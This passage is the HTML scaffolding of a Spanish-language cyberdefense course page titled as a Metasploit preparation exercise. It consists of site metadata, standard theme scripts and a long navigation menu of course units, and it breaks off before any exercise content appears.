@@ -1,0 +1,2789 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Curso de Ciberdefensa para Técnicos y Sub-Oficiales del Ejército">
+      
+      
+        <meta name="author" content="INICTEL-UNI">
+      
+      
+        <link rel="canonical" href="https://ollerenac.github.io/ciberdefensa-modulo4/conferencias/ejercicios-extra-metasploit/">
+      
+      
+        <link rel="prev" href="../../gestion-riesgos/mitigacion-controles/examen/">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.14">
+    
+    
+      
+        <title>Ejercicio extra — Preparación de Metasploit - Módulo 4: Ciberdefensa Defensiva</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.342714a4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#duracion-sugerida-6075-minutos" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../.." title="Módulo 4: Ciberdefensa Defensiva" class="md-header__button md-logo" aria-label="Módulo 4: Ciberdefensa Defensiva" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Módulo 4: Ciberdefensa Defensiva
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Ejercicio extra — Preparación de Metasploit
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/ollerenac/ciberdefensa-modulo4" title="Ir al repositorio" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    ollerenac/ciberdefensa-modulo4
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Módulo 4: Ciberdefensa Defensiva" class="md-nav__button md-logo" aria-label="Módulo 4: Ciberdefensa Defensiva" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Módulo 4: Ciberdefensa Defensiva
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/ollerenac/ciberdefensa-modulo4" title="Ir al repositorio" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81"/></svg>
+  </div>
+  <div class="md-source__repository">
+    ollerenac/ciberdefensa-modulo4
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Inicio
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Seguridad de la Información y Criptografía
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Seguridad de la Información y Criptografía
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    En el Ordenador
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            En el Ordenador
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-el-ordenador/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-el-ordenador/laboratorio-vm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    🖥 Laboratorio virtual — accesos y credenciales
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-el-ordenador/controles-defensivos-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Controles Defensivos (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-el-ordenador/controles-defensivos-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Controles Defensivos (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-el-ordenador/antivirus-avanzados-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Antivirus Avanzados (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-el-ordenador/antivirus-avanzados-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Antivirus Avanzados (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-el-ordenador/cortafuegos-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Firewall (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-el-ordenador/cortafuegos-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Firewall (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-el-ordenador/examen-parcial/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Examen Parcial
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-el-ordenador/lab-iptables-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lab — Iptables (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-el-ordenador/lab-iptables-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lab — Iptables (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    En la Red
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            En la Red
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-la-red/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-la-red/repaso-redes-defensivas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Precalentamiento y Repaso — Redes Defensivas
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-la-red/proxy-squid-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Proxy Squid (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-la-red/proxy-squid-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Proxy Squid (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-la-red/ids-ips-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    IDS e IPS (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-la-red/ids-ips-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    IDS e IPS (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-la-red/honeypots-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Honey Pots (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-la-red/honeypots-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Honey Pots (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../seguridad-criptografia/en-la-red/examen-final/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Examen Final
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Capas SI
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Capas SI
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    La Familia ISO 27000
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            La Familia ISO 27000
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/familia-iso27000/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/familia-iso27000/iso27000-generalidades-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ISO 27000 — Generalidades (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/familia-iso27000/iso27000-generalidades-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ISO 27000 — Generalidades (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/familia-iso27000/iso27001-requisitos-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ISO 27001 — Requisitos (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/familia-iso27000/iso27001-requisitos-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ISO 27001 — Requisitos (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/familia-iso27000/iso27002-controles-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ISO 27002 — Controles (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/familia-iso27000/iso27002-controles-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ISO 27002 — Controles (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/familia-iso27000/iso27005-riesgo-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ISO 27005 — Gestión del Riesgo (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/familia-iso27000/iso27005-riesgo-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ISO 27005 — Gestión del Riesgo (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/familia-iso27000/examen-parcial/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Examen Parcial
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/familia-iso27000/lab-auditoria-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lab — Auditoría Interna (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/familia-iso27000/lab-auditoria-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Lab — Auditoría Interna (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Defensa en Profundidad
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Defensa en Profundidad
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/defensa-profundidad/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/defensa-profundidad/capa-humana-perimetral-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Capa Humana y Perimetral (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/defensa-profundidad/capa-humana-perimetral-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Capa Humana y Perimetral (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/defensa-profundidad/capa-red-endpoint-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Capa de Red y Endpoint (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/defensa-profundidad/capa-red-endpoint-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Capa de Red y Endpoint (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/defensa-profundidad/capa-aplicaciones-datos-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Capa de Aplicaciones y Datos (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/defensa-profundidad/capa-aplicaciones-datos-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Capa de Aplicaciones y Datos (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/defensa-profundidad/capa-activos-criticos-p1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Activos Críticos y Escenarios Defensivos (Parte 1)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/defensa-profundidad/capa-activos-criticos-p2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Activos Críticos y Escenarios Defensivos (Parte 2)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../capas-si/defensa-profundidad/examen-final/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Examen Final
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+          
